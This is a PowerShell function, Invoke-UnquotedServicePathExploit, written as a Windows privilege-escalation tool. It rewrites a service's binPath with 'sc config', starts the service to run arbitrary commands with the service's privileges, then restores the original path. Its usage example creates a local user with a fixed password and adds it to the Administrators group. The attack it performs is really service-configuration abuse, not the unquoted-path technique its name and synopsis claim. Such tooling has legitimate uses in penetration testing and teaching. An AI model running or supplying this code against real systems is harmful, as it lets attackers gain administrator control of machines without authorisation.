Function Invoke-UnquotedServicePathExploit {
<#
.SYNOPSIS
Abuses an unquoted service path in the Windows registry to execute commands using the permissions of the user that starts the service.


.DESCRIPTION
Uses the Name property of a service. The service is modified to contain a command in the binPath value. The service is then started to execute the defined command.


.PARAMETER Name
Specifies the service names of services to be exploited. Service Name value is accepted from the pipeline.

.PARAMETER Command
Custom command to execute instead of user creation.


.EXAMPLE
Invoke-UnquotedServicePathExploit -Name wuauserv -Command "net user tobor Passw0rd1! /add", "net localgroup Administrators tobor /add"
# This example exploits 'wuauserv' to add a localuser "tobor" with password Passw0rd1! to the local administrator group


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
System.ServiceProcess.ServiceController, System.String
You can pipe a service object or a service name to this cmdlet.


.OUTPUTS
PSObject
Returns a custom PSObject consisting of the parameter values entered
#>
    [CmdletBinding()]
        param (
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Define the name of the possibly vulnerable service.")]  # End Parameter
            [ValidateNotNullOrEmpty()]
            [Alias('ServiceName')]
            [String[]]$Name,

            [Parameter(
                Mandatory=$True,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter a command or commands you want executed")]  # End Parameter
            [ValidateNotNullOrEmpty()]
            [String[]]$Command)  # End param

BEGIN {

    $Obj = @()
    If ($PSBoundParameters['Command']) {

        $Commands = @($Command)

    }  # End If

} PROCESS {

    ForEach ($ServiceName in $Name) {

        Write-Verbose -Message "[*] Obtaining object info for $ServiceName"
        $ServiceObj = Get-Service -Name $ServiceName

        Try {

            $ServiceDetails = Get-CimInstance -Class "Win32_Service" -Filter "Name='$ServiceName'"

        } Catch {

            Write-Verbose -Message "[!] Get-CimInstance is not available on device. Using Get-WmiObject"
            $ServiceDetails = Get-WmiObject -Class "Win32_Service" -Filter "Name='$ServiceName'"

        }  # End Try Catch

        $OriginalServicePath = $ServiceDetails.PathName
        Write-Verbose -Message "[*] Original Service Path Value     : '$OriginalServicePath'"

        $OriginalServiceState = $ServiceDetails.State
        Write-Verbose -Message "[*] Original State for $ServiceName : '$OriginalServiceState'"

        If ($ServiceDetails.StartMode -eq 'Disabled') {

            Write-Verbose -Message "[*] $ServiceName is disabled. Changing service startup type to Manual"
            $ServiceObj | Set-Service -StartupType "Manual" -ErrorAction Stop

        }  # End If

        ForEach ($ServiceCommand in $Commands) {

            Write-Verbose -Message "[*] Modifying service binPath value to: $ServiceCommand"
            cmd /c sc config $ServiceName binPath="$ServiceCommand"

            Write-Verbose -Message "[*] Starting $ServiceName to execute '$ServiceCommand'"
            Start-Service -Name $ServiceName -ErrorAction SilentlyContinue

            Write-Verbose -Message "[*] Running 2 second buffer between commands"
            Start-Sleep -Seconds 2

        }  # End ForEach

        Write-Verbose -Message "[*] Stopping modified service"
        Stop-Service -Name $ServiceName -Force -ErrorAction Stop

        Write-Verbose -Message "[*] Restoring original path value for $ServiceName"
        Start-Sleep -Seconds 1

        cmd /c sc config $ServiceName binPath="$OriginalServicePath"
        $ServiceObj | Set-Service -StartupType "$OriginalServiceState" -ErrorAction SilentlyContinue
        # This is used to silently continue because the original value may not be an option for -StartupType

        $Obj += New-Object -TypeName "PSObject" -Property @{
            ServiceAbused = $ServiceObj.Name
            Command = ($Commands -join ' && ')
        }  # End Property

    }  # End ForEach

} END {

    Return $Obj

}  # End BPE

}  # End Function Invoke-UnquotedServicePathExploit
